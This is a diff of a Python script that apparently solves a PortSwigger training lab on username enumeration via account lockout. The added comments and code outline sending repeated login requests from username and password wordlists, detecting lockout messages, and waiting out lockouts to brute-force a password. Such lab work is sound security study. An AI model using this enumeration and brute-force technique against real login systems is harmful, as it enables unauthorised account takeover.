@@ -1,21 +1,15 @@
-'''
-
-
-
-PROGRAM NOT FINISHED
-
-
-
-'''
-
-
-
 # A simple python program made to solve the following PortSwigger Lab:
 # https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock
 
 # Basic Logic Used In Program:
-
-# <p class="is-warning">You have made too many incorrect login attempts. Please try again in 1 minute(s).</p>
+# Enumerate Usernames
+# Send 5 HTTP POST Requests For Every Username
+# If Error Message NOT Found In Response HTML, A Lockout Has Occured, Potentially Meaning A Username Has Been Found.
+# Enumerate Passwords For Returned Username
+# Send A Single POST Request For Every Password
+# If The Error Message Is Not In The Response HTML, Either The Account Has Been Locked OR Password HAs Been Found.
+# If The Account Has Been Locked, Sleep For 60 Seconds.
+# Else Potential Password Has Been Found, Return The Current Password
 
 import sys
 import time
@@ -30,6 +24,7 @@ USERNAME_FILE = "../../Word-Lists/username-wordlist.txt"
 PASSWORD_FILE = "../../Word-Lists/password-wordlist.txt"
 FAKE_PASSWORD = "fakepassword"
 ERROR_MESSAGE = "Invalid username or password."
+LOCKOUT_MESSAGE = "Please try again in 1 minute(s)."
 NUMBER_OF_REQUESTS = 5
 
 def load_file_lines(file_name):
@@ -55,7 +50,7 @@ def find_password(username, passwords):
         RESPONSE = send_http_post(username, password)
         HTML = RESPONSE.text
         if ERROR_MESSAGE not in HTML:
-            if "Please try again in 1 minute(s)." in RESPONSE.text:
+            if LOCKOUT_MESSAGE in HTML:
                 time.sleep(60)
             else:
                 return password
